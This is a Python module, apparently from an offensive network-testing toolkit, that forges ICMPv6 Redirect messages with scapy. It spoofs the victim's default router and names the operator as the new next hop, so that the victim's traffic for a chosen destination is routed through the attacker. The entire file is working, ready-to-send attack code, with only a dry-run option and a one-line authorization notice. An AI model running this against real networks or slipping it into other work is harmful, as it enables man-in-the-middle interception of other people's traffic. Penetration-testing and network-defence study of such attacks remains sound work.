"""Redirect spoofing: send forged ICMPv6 Redirect messages so a host routes a destination through the attacker.

A router that sees a host using a suboptimal first hop sends a Redirect (RFC 4861) that tells the host
a better next hop for one destination. The host then updates its route for that destination. The
Redirect is not authenticated on a plain Ethernet segment: a host accepts it when it comes from its
current default router, and a forged Redirect can carry the router's address as its source.

This module sends one Redirect per frame to the victim. The IPv6 source is the router address you give,
which the victim expects; the Redirect names the operator's address as the new next hop, and carries
the operator's MAC as the Target Link-Layer Address. The hop limit is 255, as RFC 4861 requires. The
effect to measure is whether the victim's route for the destination now goes through the operator.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.layers.inet6 import (
    IPv6,
    ICMPv6ND_Redirect,
    ICMPv6NDOptDstLLAddr,
    ICMPv6NDOptRedirectedHdr,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import link_local_from_mac

MAX_FRAMES = 100


def validate_link_local(address: str, label: str) -> ipaddress.IPv6Address:
    try:
        parsed = ipaddress.IPv6Address(address)
    except ValueError as exc:
        raise ValueError(f"{label} {address!r} is not an IPv6 address.") from exc
    if not parsed.is_link_local:
        raise ValueError(f"{label} must be a link-local address (fe80::/10).")
    return parsed


def validate_destination(address: str) -> ipaddress.IPv6Address:
    try:
        parsed = ipaddress.IPv6Address(address)
    except ValueError as exc:
        raise ValueError(f"Destination {address!r} is not an IPv6 address.") from exc
    if parsed.is_multicast or parsed.is_unspecified or parsed.is_link_local:
        raise ValueError("Destination must be a unicast address that is not link-local.")
    return parsed


@dataclass(frozen=True)
class RedirectSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the victim
    source_mac: str                     # the attacker's MAC, named as the new next hop (required)
    router_address: str = ""            # the router's link-local address the Redirect claims to come from (required)
    victim_mac: str = ""                # the victim's MAC, the Redirect's Ethernet destination (required)
    destination: str = "2001:db8:dead::1"  # the off-link destination whose route is redirected
    frames: int = 3                     # Redirects sent, to keep the new route in place
    dry_run: bool = False               # build Redirects but do not send them
    include_redirected_header: bool = True  # RFC 4861 section 4.5: carry the original packet

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not self.router_address:
            raise ValueError("Router address is required.")
        validate_link_local(self.router_address, "Router address")
        if not self.victim_mac:
            raise ValueError("Victim MAC is required.")
        normalize_unicast_mac(self.victim_mac)
        validate_destination(self.destination)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class RedirectSpoofingStats:
    frames: int = 0
    status: str = ""


def build_redirect(config: RedirectSpoofingConfig) -> Packet:
    """One ICMPv6 Redirect: spoofed router source, victim destination, the attacker as new next hop."""
    source = normalize_unicast_mac(config.source_mac)
    victim = normalize_unicast_mac(config.victim_mac)
    victim_ll = link_local_from_mac(victim)
    attacker_ll = link_local_from_mac(source)
    destination = validate_destination(config.destination)
    # The redirected header is the original packet the victim sent (a placeholder payload here).
    original = bytes(IPv6(src=victim_ll, dst=str(destination)) / Raw(b"\x00" * 8))
    frame = (
        Ether(src=source, dst=victim)
        / IPv6(src=config.router_address, dst=victim_ll, hlim=255)
        / ICMPv6ND_Redirect(tgt=attacker_ll, dst=str(destination))
        / ICMPv6NDOptDstLLAddr(lladdr=source)
    )
    if config.include_redirected_header:
        frame = frame / ICMPv6NDOptRedirectedHdr(pkt=original)
    return frame


def run_redirect_spoofing(
    config: RedirectSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RedirectSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> RedirectSpoofingStats:
    """Send `frames` forged Redirect messages, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = RedirectSpoofingStats(
            status=(
                f"Dry run: would send {config.frames} Redirect(s) to {config.victim_mac}, claiming {config.router_address} "
                f"as the router, for {config.destination} via {config.source_mac}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RedirectSpoofingStats()
    frame = build_redirect(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} redirect(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
